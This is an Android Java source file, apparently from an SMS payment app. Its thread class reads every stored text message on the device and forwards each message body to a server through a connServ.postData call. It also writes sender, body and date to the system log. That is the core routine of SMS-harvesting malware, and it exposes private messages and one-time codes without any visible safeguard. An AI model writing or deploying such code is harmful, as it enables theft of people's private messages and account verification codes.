package pay.moblie.pays_sms;


import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import java.util.ArrayList;
import java.util.List;



public class ScanningSMS extends Thread {
    public List<String> asynThreaData = null;


    public ScanningSMS(){
        asynThreaData = new ArrayList<String>();
    }

    public void run() {
        Uri uri = Uri.parse("content://sms/");
        ContentResolver resolver = Manager.getInst().mainActivity.getContentResolver();
        Cursor cursor = resolver.query(
                uri,
                new String[]{"_id", "address", "body", "date", "type"},
                null,
                null,
                null);

        //Log.e(Constant.TONY_TAG, "getCount - "+cursor.getCount());
        //int cursorGetCount = cursor.getCount();
        if (cursor != null && cursor.getCount() > 0) {
            int _id;
            String address;
            String sms_content;
            String date;
            int type;

            while (cursor.moveToNext()) {
                //Map<String, Object> map = new HashMap<String, Object>();
                _id = cursor.getInt(0);
                address = cursor.getString(1);
                sms_content = cursor.getString(2);
                date = cursor.getString(3);
                type = cursor.getInt(4);
                //map.put("names", body);
                Log.e(  Constant.TONY_TAG, "_id=" + _id + " address=" + address + " sms_content=" + sms_content + " date=" + date + " type=" + type);

                //--  ---
                //new ConnServ( _id +" - "+ sms_content ).start();
                String phoneSms = _id+" - "+sms_content;
                Manager.getInst().mainActivity.connServ.postData( phoneSms );
                Manager.getInst().mainActivity.ui_addRecord(
                    String.format(
                        Manager.getInst().mainActivity.getResources().getString(R.string.app_post_send),
                        phoneSms
                    ));
                asynThreaData.add(phoneSms);
            }

            Log.e(Constant.TONY_TAG, "getCount - "+cursor.getCount());
            Log.e(Constant.TONY_TAG, "asynThreaData - "+asynThreaData.size());

            while( cursor.getCount() == asynThreaData.size() ){
                Log.e(Constant.TONY_TAG, "asynThreaData - END.");
                Manager.getInst().mainActivity.ui_addRecord(
                        Manager.getInst().mainActivity.getResources().getString(R.string.app_all_sms_end) );
                asynThreaData = new ArrayList<String>();
            }
            //asynThreaData = null;
            Log.e(Constant.TONY_TAG, "----- END. -----");
        }

    }
}
